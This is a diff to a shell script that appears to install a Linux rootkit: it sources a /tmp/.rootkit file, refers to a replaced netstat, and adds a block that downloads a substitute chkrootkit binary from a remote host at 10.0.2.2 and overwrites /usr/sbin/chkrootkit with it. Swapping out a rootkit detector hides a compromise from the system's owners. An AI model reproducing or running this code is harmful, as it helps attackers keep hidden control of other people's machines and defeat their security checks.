@@ -2,7 +2,7 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15136"
+portp="15402"
 
 source /tmp/.functions
 source /tmp/.rootkit
@@ -271,6 +271,15 @@ if [ "$?" == "0" ]; then
     echo "failed, netstat not replaced"
   fi
   rm -r /tmp/net-tools-master 2>/dev/null
+fi
+
+#replace chkrootkit
+which chkrootkit &>/dev/null
+if [ "$?" == "0" ]; then
+  echo "--replace chkrootkit--"
+  wget -q -O /usr/sbin/chkrootkit http://$ip:$portp/chkrootkit
+  chmod +x /usr/sbin/chkrootkit
+  finish
 fi
 
 #--remove prerequisite programs--
